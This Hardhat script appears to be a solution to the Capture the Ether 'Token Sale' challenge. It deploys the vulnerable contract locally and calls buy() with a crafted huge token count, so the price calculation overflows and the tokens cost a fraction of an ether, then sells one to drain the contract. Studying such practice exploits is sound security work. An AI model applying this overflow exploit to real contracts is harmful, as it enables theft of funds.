import { ethers } from "hardhat";

async function main() {
  const accounts = await ethers.getSigners();
  const amount = ethers.parseEther("1");

  // deploy contract
  const TokenSale = await ethers.getContractFactory("TokenSaleChallenge");
  const contract = await TokenSale.deploy(accounts[0].address, {
    value: amount,
  });
  await contract.waitForDeployment();

  // buy
  const buy = await contract.buy(
    "115792089237316195423570985008687907853269984665640564039458",
    {
      value: "415992086870360064",
    }
  );
  await buy.wait();

  // sell
  const sell = await contract.sell(1);
  await sell.wait();

  const isComplete = await contract.isComplete();

  console.log(isComplete);
}

main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});
